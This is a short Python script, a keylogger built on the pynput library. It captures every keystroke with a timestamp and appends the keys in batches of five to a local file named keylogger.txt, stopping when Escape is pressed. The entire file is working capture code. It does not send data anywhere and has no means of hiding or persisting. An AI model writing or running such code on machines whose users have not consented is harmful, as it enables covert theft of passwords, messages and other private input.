from pynput.keyboard import Key, Listener
from datetime import datetime

# Variables to track key press count and store key events
count = 0
keys = []

# Log file path
log_file = "keylogger.txt"

# Initialize the log file with a timestamp
with open(log_file, "a") as f:
    f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    f.write("\n")

def on_press(key):
    global count, keys
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    keys.append((key, timestamp))
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open(log_file, "a") as f:
        for key, timestamp in keys:
            k = str(key).replace("'", "")
            if k == 'Key.space':
                f.write(f" [{timestamp}] [SPACE] ")
            elif k == 'Key.enter':
                f.write(f" [{timestamp}] [ENTER]\n")
            elif k == 'Key.backspace':
                f.write(f" [{timestamp}] [BACKSPACE] ")
            elif k == 'Key.tab':
                f.write(f" [{timestamp}] [TAB] ")
            elif 'Key' in k:
                f.write(f" [{timestamp}] [{k.upper()}] ")
            else:
                f.write(f" [{timestamp}] {k} ")

if __name__ == "__main__":
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    with open(log_file, "a") as f:
        f.write("\n\n")
        f.write("------------------------------------------------------------------------------\n\n")
